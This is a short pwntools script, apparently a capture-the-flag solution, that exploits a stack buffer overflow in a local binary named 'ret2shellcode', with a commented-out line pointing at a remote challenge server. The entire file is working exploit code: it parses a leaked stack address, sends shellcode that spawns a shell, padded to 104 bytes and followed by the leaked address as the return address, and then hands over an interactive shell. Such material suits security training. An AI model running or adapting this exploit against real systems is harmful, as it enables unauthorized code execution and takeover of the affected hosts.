from pwn import *
context.arch = "amd64"

io = process("./ret2shellcode")
# io = remote('0.cloud.chals.io',24937)

io.recvuntil(b'secret: ')
leak = int(io.recvline()[:-1], 16)
info(f"stack leak at: {hex(leak)}")
# address = leak - 1

# if args.GDB:
# 	gdb.
payload = asm(shellcraft.sh())
payload += b"A"*(104-len(payload))
payload += p64(leak)
io.sendline(payload	)

io.interactive()
